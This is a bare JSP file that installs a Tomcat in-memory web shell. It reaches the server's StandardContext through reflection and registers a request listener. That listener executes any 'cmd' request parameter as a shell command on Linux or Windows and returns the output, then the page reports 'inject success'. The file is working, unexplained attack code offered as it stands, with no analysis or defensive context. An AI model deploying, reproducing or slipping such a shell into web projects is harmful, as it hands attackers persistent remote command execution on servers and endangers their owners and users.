<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="javax.servlet.*" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>

<%
    ServletContext servletContext = request.getSession().getServletContext();
    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
    ServletRequestListener servletRequestListener = new ServletRequestListener() {
        @Override
        public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
        }
        @Override
        public void requestInitialized(ServletRequestEvent servletRequestEvent) {
            String cmd = servletRequestEvent.getServletRequest().getParameter("cmd");
            if (cmd != null) {
                try {
                    boolean isLinux = true;
                    String osTyp = System.getProperty("os.name");
                    if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                        isLinux = false;
                    }
                    String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                    Scanner s = new Scanner(in).useDelimiter("\\a");
                    String output = s.hasNext() ? s.next() : "";
                    response.getOutputStream().write(output.getBytes());
                    response.getOutputStream().flush();
                    response.getOutputStream().close();
                    return;
                } catch (IOException e) {
                }
            }
        }
    };
    standardContext.addApplicationEventListener(servletRequestListener);
    out.println("inject success");
%>